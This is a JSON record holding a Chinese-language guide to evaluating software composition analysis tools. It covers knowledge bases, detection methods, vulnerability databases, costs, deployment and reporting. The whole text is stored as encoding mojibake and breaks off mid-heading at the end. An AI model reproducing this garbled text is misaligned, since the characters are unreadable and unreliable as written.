[{"id":"0f4f52fd9bba6992ed16037b649e9241","title":"è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·è¯„ä¼°å¼€æ”¾æŒ‡å—","content":"1.ä»‹ç»Â  Â å€ŸåŠ©è½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰å·¥å…·ï¼Œè½¯ä»¶å¼€å‘å›¢é˜Ÿèƒ½ä»è®¸å¯è¯åˆè§„å’Œå®‰å…¨æ¼æ´è§’åº¦è·Ÿè¸ªå’Œåˆ†æå¼•å…¥åˆ°é¡¹ç›®é‡Œçš„ä»»ä½•å¼€æºä»£ç ã€‚è¿™æ ·çš„å·¥å…·å‘ç°å¼€æºä»£ç ï¼ˆä¸åŒç¨‹åº¦çš„ç»†èŠ‚å’ŒåŠŸèƒ½ï¼‰ï¼Œä»–ä»¬ç›´æ¥å’Œé—´æ¥ä¾èµ–ã€è®¸å¯è¯æœ‰æ•ˆæ€§ï¼Œå’Œä»»ä½•å·²çŸ¥çš„å®‰å…¨æ¼æ´åŠæ½œåœ¨çš„æ”»å‡»ã€‚å¥½å¤šå…¬å¸æä¾›è½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰å·¥å…·å¥—è£…ã€å¼€æºå·¥å…·ã€ä½œä¸ºç¤¾åŒºé¡¹ç›®é©±åŠ¨çš„ç›¸å…³æœåŠ¡ã€‚æ€»æœ‰å…³äºä»€ä¹ˆå·¥å…·æœ€é€‚åˆç‰¹å®šçš„æ¨¡å‹å’Œç¯å¢ƒçš„é—®é¢˜ï¼Œç¼ºå°‘å¯¹æ¯”å’Œè¯„ä¼°å·¥å…·çš„æ ‡å‡†æ–¹æ³•ï¼Œå¾ˆéš¾å›ç­”è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤ï¼Œæœ¬æ–‡çš„ç›®æ ‡æ˜¯æ¨èä¸€ç³»åˆ—å¯¹æ¯”æŒ‡æ ‡ï¼Œç”¨ä»¥è¯„ä»·å¤šä¸ªè½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰å·¥å…·ã€‚\nÂ  Â æœ¬æ–‡æ˜¯ã€Šä¼ä¸šä¸­å¼€æºè½¯ä»¶åˆè§„æ€§ã€‹ï¼ˆç¬¬äºŒç‰ˆï¼‰ä¸€ä¹¦ä¸­ç¬¬12ç« çš„é‡å¤§æ›´æ–°ç‰ˆã€‚è¿™æœ¬ä¹¦è®°å½•å’Œå‘å¸ƒäº†å¯¹æ¯”åŠè¯„ä¼°è½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰å·¥å…·çš„æŒ‡æ ‡ï¼Œæœé›†åé¦ˆã€æ¨åŠ¨å»ºç«‹å¯¹æ¯”å’Œè¯„æµ‹çš„æ ‡å‡†åŒ–æ¨¡å‹ã€‚è¯·æ³¨æ„ï¼Œæ²¡æœ‰â€œä¸€åŠ³æ°¸é€¸â€çš„æ–¹æ¡ˆï¼Œåœ¨å¸‚åœºä¸Šæœ‰è®¸å¤šå·¥å…·ï¼Œå…·æœ‰ä¸åŒåŠŸèƒ½ã€æˆç†Ÿåº¦æ°´å¹³ã€éƒ¨ç½²æ¨¡å‹ç­‰ã€‚å½“ä½ å¼€å§‹è¿™æ®µæ—…ç¨‹æ—¶ï¼Œæˆ‘ä»¬å¼ºçƒˆæ¨èä½ æ ¹æ®ç‰¹å®šç¯å¢ƒå’Œè¦æ±‚ï¼Œç¡®å®šæœ€æƒ³è¦çš„åŠŸèƒ½ï¼Œç„¶åæ ¹æ®è¿™äº›æŒ‡æ ‡å¯¹å·¥å…·è¿›è¡Œæµ‹è¯•å’Œè¯„åˆ†ã€‚\n2.è¯„ä¼°æŒ‡æ ‡2.1.Â çŸ¥è¯†åº“\nçŸ¥è¯†åº“çš„å¤§å°é€šå¸¸ä»¥å¼€æºé¡¹ç›®çš„æ•°é‡å’Œè·Ÿè¸ªæ–‡ä»¶çš„æ•°é‡æ¥è¡¡é‡ã€‚çŸ¥è¯†åº“å­˜å‚¨å¼€æºè½¯ä»¶çš„ä¿¡æ¯ï¼Œæ•°æ®åº“è¶Šå¤§ï¼Œå½“ä½ æ‰«ææ—¶ï¼Œå°±èƒ½è¯†åˆ«æ›´å¤šçš„å¼€æºä»£ç ã€‚\n\nåˆ—å‡ºè·Ÿè¸ªçš„ä¸»è¦åº“ï¼ˆå¦‚æ‰€æœ‰NPMï¼ŒSourceForgeç­‰ï¼‰\n\nè·Ÿè¸ªå“ªäº›ç”Ÿæ€ç³»ç»Ÿï¼ˆå¦‚Rï¼ŒDelphiç­‰ï¼‰\n\nèŒƒå›´ä¸­åŒ…æ‹¬ä»€ä¹ˆè¯­è¨€ï¼ˆåŸºäºæ‰©å±•å’Œåº“ç±»å‹ï¼‰ã€‚ç†æƒ³æƒ…å†µæ˜¯ï¼Œæ‰«æå™¨åº”è¯¥å’Œè¯­è¨€æ— å…³ï¼›ç„¶è€Œï¼ŒåŸºæœ¬æ²¡æœ‰å‚å•†æä¾›è¿™ç§æ”¯æŒï¼Œå› æ­¤éœ€è¦æ¾„æ¸…æ”¯æŒä»€ä¹ˆè¯­è¨€\n\nåŒºåˆ†åŒ…ä¹‹é—´çš„æ£€æµ‹çº§åˆ«ï¼ˆå¦‚Mavenå’Œâ€œJavaâ€æ”¯æŒï¼Œä¾‹å¦‚ï¼Œä½ èƒ½å‘ç°jarä¾èµ–ï¼Œä½†å®é™…ä¸Šä¸æ‰«æ.javaæºæ–‡ä»¶çš„ç‰ˆæƒ&#x2F;è®¸å¯è¯ä¿¡æ¯ï¼‰\n\nçŸ¥è¯†åº“æ›´æ–°é¢‘ç‡ã€‚é¢‘ç‡é«˜çš„æ›´æ–°æ›´å—æ¬¢è¿ï¼Œå’Œå¼€æºè½¯ä»¶çš„å‘å±•ä¿æŒä¸€è‡´ã€‚åˆè§„æœåŠ¡å’Œå·¥å…·æä¾›å•†æœ‰å®šæœŸæ›´æ–°ä»–ä»¬çš„æ•°æ®åº“ã€‚æœ‰çš„å…¬å¸æ¯å¹´æ›´æ–°ä¸‰åˆ°å››æ¬¡ï¼Œå…¶ä»–å…¬å¸åˆ™é¢‘ç‡æ›´é«˜ï¼ˆç›´åˆ°æ¯å¤©ï¼‰ï¼Œç†æƒ³æƒ…å†µä¸‹ï¼Œä½ å¸Œæœ›æœ‰æœ€å¤§å’Œæœ€æ–°çš„æ•°æ®åº“ï¼Œå¢åŠ è¯†åˆ«æ–°å‘å¸ƒçš„å¼€æºä»£ç çš„æœºä¼šã€‚\n\nä¸€ä¸ªå®¢æˆ·çš„éœ€æ±‚å¤šä¹…èƒ½è¢«æ·»åŠ åˆ°çŸ¥è¯†åº“ä¸­ï¼Œå¯¹å®¢æˆ·éœ€æ±‚å“åº”æœ‰æœåŠ¡æ°´å¹³åè®®ï¼ˆSLAï¼‰å—ï¼Ÿæµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ\n\n\n2.2.Â æ£€æµ‹èƒ½åŠ›\næ•´ä½“ç»„ä»¶\n\nçº æ­£&#x2F;é…ç½®åˆ†æå™¨çš„èƒ½åŠ›-è½¯ä»¶é¡¹ç›®å¾ˆå¤æ‚ï¼Œæœ‰ä¸åŒçš„æ„å»ºæ­¥éª¤ï¼Œéœ€è¦ä¸€ä¸ªæ–¹æ³•å»é…ç½®å·¥å…·ï¼Œæ•è·ç°å®\n\næ£€æµ‹ä½¿ç”¨çš„æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿä¸åŒçš„åˆ†ææ–¹æ³•å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œå·¥å…·ç”Ÿæˆè€…åº”è¯¥æ€»ç»“æ¯ä¸ªä½¿ç”¨çš„æ‰«æå™¨ï¼Œå¦‚ä½•å¸®åŠ©æ£€æµ‹ã€‚\n\néƒ¨åˆ†ç‰‡æ®µ-ä»å‡ è¡Œåˆ°éƒ¨åˆ†æ–‡ä»¶\n\næä¾›ä»€ä¹ˆé€‰é¡¹æ¥çº æ­£å’ŒéªŒè¯ç»“æœï¼Ÿæ”¯æŒç»“æœæ’åºåŠŸèƒ½å—ï¼ˆä¾‹å¦‚P1æˆ–ä¸¥é‡çº§ï¼‰ï¼Ÿ\n\nè‡ªåŠ¨è¯†åˆ«å…·æœ‰æ­£ç¡®æ¥æºå’Œè®¸å¯è¯çš„ä»£ç ï¼Œä¸éœ€è¦åˆè§„å·¥ç¨‹å¸ˆæ“ä½œå·¥å…·æ¥åˆ¤æ–­ä»€ä¹ˆæ˜¯æ­£ç¡®çš„åŒ¹é…ï¼Œä»€ä¹ˆæ˜¯è¯¯æŠ¥ã€‚è®¸å¤šæºä»£ç æ‰«æå¼•æ“ï¼Œç‰¹åˆ«æ˜¯æ”¯æŒç‰‡æ®µæ‰«æï¼Œèƒ½å¤Ÿç”Ÿæˆç›¸å½“æ•°é‡çš„è¯¯æŠ¥ï¼Œéœ€è¦è°ƒæŸ¥å’Œæ‰‹åŠ¨è§£å†³ã€‚è¯¯æŠ¥ç‡å¯¼è‡´çš„å¤§é‡äººåŠ›æ¶ˆè€—ï¼Œæ˜¯ä»Šå¤©å¸‚åœºä¸Šå¾ˆå¤šæœ€å‡ºåäº§å“ä¸€ç›´å­˜åœ¨çš„é—®é¢˜ã€‚å½“è¯„ä¼°è¿™æ ·çš„äº§å“æ—¶ï¼Œæˆ‘ä»¬æ¨èä¼˜å…ˆè€ƒè™‘èƒ½è‡ªåŠ¨è¯†åˆ«æºä»£ç ç‰‡æ®µï¼Œå…·æœ‰éœ€è¦æ‰‹åŠ¨æ£€æŸ¥çš„æœ€å°è¯¯æŠ¥ç‡ã€‚\n\næ”¯æŒå“ªç§ç±»å‹çš„åˆ†æï¼ˆåŒ…æ£€æµ‹ï¼Œç²¾ç¡®æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œç”¨æ¥å‘ç°å•ä¸ªæºæ–‡ä»¶ã€äºŒè¿›åˆ¶æ–‡ä»¶ã€å¤šåª’ä½“æ–‡ä»¶ï¼‰\n\næºä»£ç æ‰«æï¼ˆä»£ç -&gt;å±äºå“ªä¸ªå¼€æºè½¯ä»¶åŒ…ï¼‰ï¼Ÿ\n\näºŒè¿›åˆ¶æ‰«æï¼ˆäºŒè¿›åˆ¶-&gt;å±äºå“ªä¸ªå¼€æºè½¯ä»¶åŒ…ï¼‰ï¼Ÿ\n\nç‰‡æ®µæ‰«æï¼ˆä»£ç ç‰‡æ®µ-&gt;æ‹·è´äºå“ªä¸ªå¼€æºè½¯ä»¶åŒ…ï¼‰ï¼Ÿ\n\nä¾èµ–æ‰«æï¼ˆä»£ç -&gt;Â é€šè¿‡åŒ…ç®¡ç†å™¨ï¼ŒåŒ…å«å“ªä¸ªä¾èµ–ï¼‰ï¼Ÿ\n\nè®¸å¯è¯æ‰«æï¼ˆä»£ç -&gt;å¼€æºè½¯ä»¶è®¸å¯è¯ï¼‰\n\næ”¯æŒä»€ä¹ˆè¯­è¨€?å¦‚æœæ”¯æŒæŸç§è¯­è¨€ï¼Œä¹Ÿæ”¯æŒç‰‡æ®µåˆ†æå—ï¼Ÿä»…é™äºåŒ…æ°´å¹³å—ï¼Ÿç²¾ç¡®æ–‡ä»¶åŒ¹é…ï¼Ÿ\n\nå®‰å…¨æ‰«æå™¨ï¼ˆä»£ç -&gt;æ¼æ´ï¼Ÿï¼‰\n\nå…¶ä»–æ¼æ´æ£€æµ‹æŠ€æœ¯ï¼ŒåŒ…æ‹¬æœç´¢æœ¯è¯­ï¼Œç”µå­é‚®ä»¶&#x2F;URLæ£€æµ‹ï¼ŒwebæœåŠ¡æ£€æµ‹ç­‰\n\n\n2.3æ˜“ç”¨æ€§æ˜“ç”¨æ€§å¾ˆé‡è¦ï¼Œå› ä¸ºå¦‚æœä½ æ‰€æœ‰çš„å·¥ç¨‹å¸ˆè¦è®¿é—®å’Œä½¿ç”¨æ‰«æå·¥å…·ï¼ˆè€Œä¸æ˜¯ä»…é™åˆè§„å·¥ç¨‹å¸ˆï¼‰ï¼Œä½ å¯ä»¥åœ¨åˆè§„é—®é¢˜å‡ºç°ä¹‹å‰å’Œå·¥ç¨‹å¸ˆä½¿ç”¨æ„å»ºå·¥å…·é›†æˆæ–°ä»£ç ä¹‹å‰ï¼Œé¿å…åˆè§„é—®é¢˜ï¼Œä½ å°†æƒ³è¦ä¸€ä¸ªå®¹æ˜“ä½¿ç”¨çš„å·¥å…·ï¼Œæœ€å°åŒ–å­¦ä¹ æ›²çº¿ï¼Œé¿å…é«˜æˆæœ¬ä¸“ä¸šåŸ¹è®­ã€‚\n\nç›´è§‚çš„è®¾è®¡å’Œç”¨æˆ·ç•Œé¢\n\næœ¬åœ°å®¢æˆ·ç«¯æˆ–æµè§ˆå™¨æ’ä»¶å¯ç”¨\n\nç§»åŠ¨ç”¨æˆ·å¯ç”¨\n\nè¦æ±‚æœ€å°æˆ–ä¸éœ€è¦åŸ¹è®­ï¼ŒåŸ¹è®­ç”¨æ¥â€œäº†è§£å¦‚ä½•æ£€æŸ¥å’Œè¯„ä¼°ç»“æœâ€ã€‚è¯·æ³¨æ„ï¼Œæ˜“ç”¨æ€§æ˜¯ä¸€ä¸ªéå¸¸ä¸»è§‚çš„æ ‡å‡†ï¼Œå¾ˆéš¾é‡åŒ–æˆ–å®šæ€§ã€‚ç„¶è€Œï¼Œä¸€äº›å·¥å…·ç¡®å®æ¯”å…¶ä»–å·¥å…·æ›´æ˜“äºä½¿ç”¨ã€‚\n\n\nÂ \n2.4.Â æ“ä½œåŠŸèƒ½\næºä»£ç æ‰«æé€Ÿåº¦ï¼šæºä»£ç æ‰«æçš„é€Ÿåº¦æ˜¯ä»Šå¤©å¸‚åœºä¸Šè®¸å¤šäº§å“çš„ç—›ç‚¹ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå…¬å¸è®¾è®¡å’Œå¼€å‘äº†è‡ªå·±çš„æ•°æ®åº“ï¼Œéå¸¸é€‚åˆæ“ä½œè¿™ç§ç±»å‹çš„æ•°æ®ã€‚å› æ­¤ï¼Œä»–ä»¬æœ‰ä¸€ä¸ªé—ªç”µèˆ¬æ‰«æé€Ÿåº¦ï¼Œæ¯”å…¶ä»–ç°æœ‰å·¥å…·éƒ½å¿«ã€‚æ­¤å¤–ï¼Œå½“ä½ æŠŠæŒç»­é›†æˆæµç¨‹å’Œæ‰«æå™¨é›†æˆæ—¶ï¼Œæ‰«æé€Ÿåº¦ç‰¹åˆ«æœ‰ç”¨ã€‚éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯æ–‡ä»¶è¢«è·³è¿‡æ—¶é€Ÿåº¦é—®é¢˜ï¼Œå¦ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œæ˜¯å¦çœŸæ­£æ‰§è¡Œäº†ç‰ˆæƒå’Œè®¸å¯è¯æ£€æµ‹ï¼Œæˆ–ä»…ä»…æ‰«æåº“&#x2F;åŒ…ç®¡ç†æ–‡ä»¶ï¼Œå¦‚pom.xmlæ–‡ä»¶ã€‚\n\nä½¿ç”¨å·¥å…·è¿›è¡Œå’Œæ”¶è´­æ´»åŠ¨ç›¸å…³çš„æ‰«æï¼Œåœ¨ä½¿ç”¨æ¨¡å¼ä¸Šä¸è¦æœ‰è®¸å¯è¯é”å®šã€‚ä¸€äº›å‚å•†é€šè¿‡è®¸å¯è¯åè®®ï¼Œåªå…è®¸æ‰«æå’Œå½“å‰é¡¹ç›®æœ‰å…³çš„ä»£ç ï¼Œå¯¹è¿™ä¹‹å¤–çš„ä½¿ç”¨åœºæ™¯åŠ ä»¥é™åˆ¶ã€‚ä½ éœ€è¦æ¸…æ¥šè¿™ä¸ªäº‹å®ï¼Œç¡®ä¿¡ä½ èƒ½å……åˆ†ä½¿ç”¨è¯¥å·¥å…·ï¼Œä¾‹å¦‚ï¼Œå¯¹ä½ å…¬å¸æ­£åœ¨è€ƒè™‘çš„ä»»ä½•å¹¶è´­äº¤æ˜“ã€‚\n\nç¼–ç¨‹è¯­è¨€æ— å…³ï¼šä¸€äº›å·¥å…·åˆ›å»ºè€…æ‰¿è®¤ï¼Œä»–ä»¬çš„äº§å“éå¸¸æ“…é•¿æŸç§ç¼–ç¨‹è¯­è¨€ï¼Œä½†å¯¹å…¶ä»–çš„åˆ™ä¸è¡Œã€‚è¿™å¾ˆæœ‰è¶£ï¼Œå› ä¸ºä½ å¸Œæœ›ä»»ä½•æ‰«æå’Œè¯†åˆ«å¼•æ“éƒ½åº”è¯¥å’Œç¼–ç¨‹è¯­è¨€æ— å…³ï¼Œå¤§å¤šæ•°å·¥å…·å¹¶éå¦‚æ­¤ï¼Œå‡ ä¹æ²¡æœ‰å’Œè¯­è¨€æ— å…³çš„ã€‚\n\næ•´ä¸ªç»„ç»‡ä¸­ï¼Œé‡å¤ä½¿ç”¨æ‰«ææ¾„æ¸…ï¼ˆscan clarificationï¼‰çš„åŠŸèƒ½ã€‚\n\nå’Œæ„å»ºç³»ç»Ÿï¼ˆCD&#x2F;CIï¼‰æ— å…³ã€‚ã€‚\n\n\n2.5 é›†æˆåŠŸèƒ½\næä¾›å®¹æ˜“é›†æˆçš„APIï¼Œå’Œå‘½ä»¤è¡Œæ¥å£ï¼ˆCLIï¼‰ï¼šä½¿ç”¨æ‰«æå·¥å…·çš„æ–¹å¼ä¸ä»…é™äºç”¨æˆ·ç•Œé¢ã€‚ç†æƒ³æƒ…å†µï¼Œå…¬å¸å¸Œæœ›å·¥å…·å’Œä»–ä»¬å½“å‰çš„å¼€å‘ã€æ„å»ºåŠæµç¨‹é›†æˆåˆ°ä¸€èµ·ã€‚å¦‚æœæ‰«æå·¥å…·æ”¯æŒAPIï¼ŒCLIå°†å…è®¸ç³»ç»Ÿç®¡ç†å‘˜å’Œç”¨æˆ·ç•Œé¢ä¹‹å¤–çš„å·¥å…·äº¤äº’ï¼Œè¿™æ ·çš„åœºæ™¯æ˜¯å¯è¡Œçš„ã€‚ã€‚\n\næ”¯æŒç”¨æˆ·ç•Œé¢ï¼ˆUIï¼‰é›†æˆåŠŸèƒ½ã€‚\n\nå°†ç»„ç»‡çš„åˆè§„ç­–ç•¥é›†æˆåˆ°å·¥å…·å†…ï¼Œå½“å’Œå£°æ˜çš„ç­–ç•¥åŠè§„åˆ™æœ‰å…³æ—¶ï¼Œå…·æœ‰è§„åˆ™æ ‡è®°ç ï¼ˆflag codeï¼‰ã€‚\n\n\n2.6.Â Â å®‰å…¨æ¼æ´æ•°æ®åº“\næ¼æ´æ•°æ®åº“çš„è§„æ¨¡-æ‰€æœ‰é¡¹ç›®ä¸­è·Ÿè¸ªçš„æ¼æ´æ•°é‡ï¼šæ•°æ®åº“åŒ…å«å·²çŸ¥æ¼æ´ä¿¡æ¯ï¼Œèƒ½æ”¯æŒå·¥å…·æ£€æµ‹æºä»£ç ä¸­å®‰å…¨ç›¸å…³çš„é—®é¢˜ã€‚è¯·æ³¨æ„â€œæºä»£ç â€ä¸€è¯ï¼Œæ²¡æœ‰ç‰¹åˆ«æŒ‡å®šæ˜¯å¼€æºç»„ä»¶æˆ–ç¬¬ä¸‰æ–¹ç»„ä»¶ã€‚å¦‚æœå¤åˆ¶çš„ä»£ç åŒ…å«å·²çŸ¥å®‰å…¨æ¼æ´ï¼Œå½“ä½ æ‰«æç§æœ‰ç»„ä»¶æ—¶ï¼Œä½ çš„å¼•æ“åº”è¯¥èƒ½æ ‡è®°è¿™ä¸ªæ¼æ´ã€‚\n\næ¼æ´æ•°æ®åº“æ›´æ–°é¢‘ç‡ï¼šæœåŠ¡æä¾›å•†å®šæœŸæ›´æ–°ä»–ä»¬çš„æ•°æ®åº“ï¼Œæ›´æ–°å‘¨æœŸè¶ŠçŸ­ï¼Œä¹Ÿå°±èƒ½æ›´å¥½åœ°å‘ç°æ¼æ´ã€‚\n\næ¼æ´ä¿¡æ¯æºçš„æ•°é‡ï¼šå¤šä¸ªä¿¡æ¯æºèƒ½å¤Ÿå……å®å¼€æºç»„ä»¶ä¸­å®‰å…¨æ¼æ´æ•°æ®åº“ã€‚å½“è¯„ä¼°æä¾›è¿™ä¸ªæœåŠ¡çš„åˆè§„å·¥å…·æ—¶ï¼Œæˆ‘ä»¬æ¨èè°ƒæŸ¥è¿™ä¸ªæ–¹é¢å’Œæ¢ç´¢å®é™…ä¸Šçš„æ›´æ–°æœºåˆ¶ã€‚ä½¿ç”¨å„ç§ä¿¡æ¯æºï¼ˆç›´æ¥å’Œé—´æ¥ï¼‰æ¥æ”¶é›†å®‰å…¨æ¼æ´çš„ä¿¡æ¯ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šï¼Œæå‡ºä¿®å¤è¿™äº›æ¼æ´çš„å»ºè®®ã€‚\n\nå·¥å…·æä¾›å•†ä¸ºéªŒè¯æ¼æ´æŠ¥è­¦ï¼Œè€Œä»äº‹çš„ä»»ä½•å…¶ä»–ç ”ç©¶ã€‚\n\nç²¾ç¡®åº¦ï¼ˆæ¼æ´è¢«æ­£ç¡®è¯†åˆ«çš„æ¯”ç‡ï¼‰ã€‚æœ‰å››ä¸ªçº§åˆ«çš„å‡†ç¡®ç‡ã€‚\n\n\n Â - 1Â å­˜åœ¨æ¼æ´çš„è½¯ä»¶å·²ç»è¢«æ­£ç¡®åœ°å¯¹åº”åˆ°æˆ‘ä»¬ç§æœ‰è½¯ä»¶ä¸­å®é™…ä½¿ç”¨çš„ä¾èµ–é¡¹ Â - 2 ä¾èµ–é¡¹ç”¨åœ¨é‡è¦çš„ç¯å¢ƒï¼ˆè¿è¡Œæ—¶ï¼‰ã€‚ Â - 3 åœ¨é‡è¦ç¯å¢ƒä¸­çš„ç§æœ‰è½¯ä»¶è°ƒç”¨äº†ä¾èµ–é¡¹çš„æ¼æ´éƒ¨åˆ†ã€‚ Â - 4 æ¼æ´å¯è¢«æ”»ç ´ã€‚\n\nå¬å›ç‡ï¼ˆrecallï¼‰ï¼ˆå‘ç°äº†å¤šå°‘æ½œåœ¨çš„çœŸå®æ¼æ´ï¼Œå¹¶æ­£ç¡®åŒ¹é…åˆ°ç§æœ‰è½¯ä»¶ï¼Ÿï¼‰ã€‚å®é™…ä¸Šï¼Œè¿™ä¸å¯èƒ½çŸ¥é“ã€‚å¯¹æ¯”ä¸åŒçš„è§£å†³æ–¹æ¡ˆï¼Œå¯¹ç‰¹å®šçš„æŠ€æœ¯æ ˆï¼Œä¼°è®¡ä»€ä¹ˆæ–¹æ¡ˆå…·æœ‰æœ€é«˜çš„å¬å›ç‡ã€‚\n\nä¸Šä¸‹æ–‡ç›¸å…³çš„æ¼æ´æ’åºåŠŸèƒ½ã€‚å¸¸è§æ¼æ´ä¸¥é‡æ€§æ’åï¼Œå¦‚CVSS3ï¼Œç”±äºç§æœ‰è½¯ä»¶çš„ç¯å¢ƒï¼Œå¯èƒ½ä¸å‡†ç¡®ã€‚ç”¨æˆ·åº”è¯¥èƒ½å¤Ÿå…³è”æ¼æ´çš„ä¸¥é‡æ€§æ¥æ’åºï¼Œä»¥ä¾¿æ›´å‡†ç¡®è§£å†³å®‰å…¨å¨èƒã€‚\n\n\n2.7é«˜çº§æ¼æ´å‘ç°æ–¹æ³•Â Â Â æ”¯æŒé«˜çº§æ¼æ´å‘ç°ï¼Œå½“æœ‰æ¼æ´çš„ä»£ç å¤åˆ¶åˆ°ä¸€ä¸ªæ–°ç»„ä»¶æ—¶ï¼ˆè¦æ±‚æ”¯æŒæºä»£ç ç‰‡æ®µè¯†åˆ«ï¼‰ï¼Œè¯†åˆ«æ¼æ´ã€‚\n2.8.ç›¸å…³æˆæœ¬éœ€è¦è€ƒè™‘å‡ ä¸ªæˆæœ¬å‚æ•°ï¼š\n\nåŸºç¡€è®¾æ–½æˆæœ¬ï¼šITÂ åŸºç¡€è®¾æ–½æˆæœ¬å’Œè‡ªå·±å®‰è£…æˆ–é€šè¿‡äº‘ä½¿ç”¨æœ‰å…³ã€‚æ¶‰åŠåˆ°å®¢æˆ·éœ€è¦è´­ä¹°ã€å®‰è£…å’Œç»´æŠ¤çš„æœåŠ¡å™¨ï¼ŒåŒ…æ‹¬å‡çº§åŸºç¡€è®¾æ–½è´¹ç”¨ï¼Œå–å†³äºè§„æ¨¡ã€ä¸“é—¨çš„ç³»ç»Ÿç®¡ç†å‘˜æˆæœ¬çš„å¤šå°‘ã€‚\n\nè¿ç»´æˆæœ¬ï¼šæˆæœ¬å’Œç®¡ç†å·¥å…·æä¾›çš„ç»“æœæœ‰å…³ï¼Œæ¶‰åŠåˆ°æ£€æŸ¥å’Œè§£é‡Šç»“æœï¼Œé‡‡å–åˆé€‚çš„è¡ŒåŠ¨ï¼Œè‡ªåŠ¨è¯†åˆ«è¯¯æŠ¥çš„å·¥å…·å°†é™ä½äººå·¥ç¡®è®¤ä¸Šåƒä¸ªè¯¯æŠ¥çš„äººåŠ›æˆæœ¬ã€‚\n\næ¯å¹´è®¸å¯è¯æˆæœ¬ï¼šä½¿ç”¨å·¥å…·çš„æ¯å¹´è½¯ä»¶è®¸å¯è´¹ç”¨ï¼ˆæ¯ç”¨æˆ·æˆæœ¬ã€æˆ–ä¸é™ä½¿ç”¨ï¼‰ã€‚è®¿é—®SDKæˆæœ¬ï¼Œè¿™æ ·ä½ èƒ½æŠŠæ‰«æå¼•æ“å’Œå†…éƒ¨å·¥å…·é›†æˆèµ·æ¥ï¼Œä»¥åŠä»»ä½•æ‚¨æƒ³è¦å¼•å…¥çš„åŠŸèƒ½ã€æ»¡è¶³éœ€æ±‚ï¼Œå®šåˆ¶åŒ–çš„æˆæœ¬ã€‚\n\nå’Œç°æœ‰å¼•æ“&#x2F;ITå·¥å…·å’ŒåŸºç¡€è®¾æ–½é›†æˆåˆå§‹æˆæœ¬ï¼šé›†æˆè´¹ç”¨å¾ˆéš¾ä¼°è®¡ï¼Œä½†ä»–ä»¬ä¸»è¦æ˜¯ä¸æ–­å‘å±•èƒ½åŠ›ï¼ŒæŠŠå·¥å…·é›†æˆåˆ°å·¥ä½œæµå’Œæµç¨‹ä¸­ï¼Œæœ€å°ä¸­æ–­ã€‚\n\nå¯¼å‡ºé¡¹ç›®å’Œå…¶ä»–ä¿¡æ¯çš„èƒ½ï¼Œå¯èƒ½æ˜¯è½¬ç§»åˆ°ä¸€ä¸ªæ–°ç³»ç»Ÿï¼Œæˆ–è€…æ˜¯ç¦»å¼€æ—§å‚å•†ä¿ç•™çŸ¥è¯†ã€‚\n\nç»‘å®šæˆæœ¬ï¼ˆå¦‚æœä½ éœ€è¦é€€å‡ºå¹¶é‡‡ç”¨å…¶ä»–æ–¹æ¡ˆæ—¶ï¼Œéœ€è¦è€ƒè™‘çš„æˆæœ¬å› ç´ ï¼‰ï¼šå½“å›´ç»•ç€ç‰¹å®šå·¥å…·ï¼Œæ‰“é€ æ•´ä¸ªåˆè§„ç¯å¢ƒï¼Œå…¬å¸å¸¸å¸¸å¿½è§†æˆ–æ²¡æœ‰è¶³å¤Ÿçš„é‡è§†ç»‘å®šå› ç´ å’Œæˆæœ¬ã€‚å½“é€‰æ‹©ä¸€ä¸ªæ–°å·¥å…·ä¹‹åˆï¼Œæˆ‘ä»¬å»ºè®®åœ¨è¿™ä¸ªæ–¹é¢è€ƒè™‘å‘¨å…¨ã€‚\n\nç¬¦åˆç‰¹å®šéœ€è¦çš„å·¥ç¨‹å®šåˆ¶æˆæœ¬\n\n\n2.9 éƒ¨ç½²æ¨¡å‹çš„æ”¯æŒæ”¯æŒå„ç§éƒ¨ç½²æ¨¡å‹ï¼š\n\næœ¬åœ°\n\näº‘\n\næ··åˆéƒ¨ç½²\n\n\nä½ çš„ä»£ç å’Œé¡¹ç›®ç•™ç»™ç½‘ç»œä»€ä¹ˆä¿¡æ¯ï¼Ÿå¯¹æœ€ç»ˆç”¨æˆ·è¦éå¸¸é€æ˜ï¼š\n\næºä»£ç å’ŒäºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹\n\néƒ¨åˆ†æ–‡ä»¶å†…å®¹&#x2F;å­—ç¬¦ä¸²\n\nå“ˆå¸Œå€¼\n\nç¼–å½•æ¸…å•\n\nç­–ç•¥ä¿¡æ¯\n\nåˆè§„&#x2F;ä¸åˆè§„çŠ¶æ€\n\n\n2.10 æŠ¥å‘ŠåŠŸèƒ½\nç”Ÿæˆè¦æ±‚çš„åˆè§„é€šçŸ¥ï¼šé€šçŸ¥æ˜¯åŸºäºå®é™…æ‰«æç»“æœæˆ–è€…æ˜¯ä»…ä»…ä»çŸ¥è¯†åº“æ‹‰å–çš„è®¸å¯è¯ä¿¡æ¯ï¼Ÿ\n\nå­ç»„ä»¶å’Œå­æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿé€šçŸ¥ä¸­åŒ…æ‹¬å®é™…ç‰ˆæƒ&#x2F;è®¸å¯è¯å—ï¼Ÿ\n\nå¼€æºä»£ç ç‰‡æ®µçš„é€šçŸ¥æ˜¯ä»€ä¹ˆï¼Ÿ\n\næ”¯æŒå„ç§æŠ¥å‘ŠåŠŸèƒ½-è¾“å‡ºå„ç§æ ¼å¼çš„æŠ¥å‘Šï¼Œå¦‚Excel&#x2F;ç”µå­è¡¨æ ¼ï¼ˆSpreadsheetï¼‰ï¼ˆåŒ…æ‹¬æä¾›è¯¦ç»†æŠ¥å‘Šæ ·æœ¬ï¼‰\n\næ”¯æŒå¼€æ”¾æ ‡å‡†æ ¼å¼ï¼ˆè½¯ä»¶åŒ…æ•°æ®äº¤æ¢ï¼ˆsoftwareï¼Œpackage data exchangeï¼ŒSPDXï¼‰ï¼ŒSARIFï¼ŒCVEï¼ŒCVSSç­‰ï¼‰\n\n\næ¦‚å¿µè§£é‡Šå‚è€ƒæ 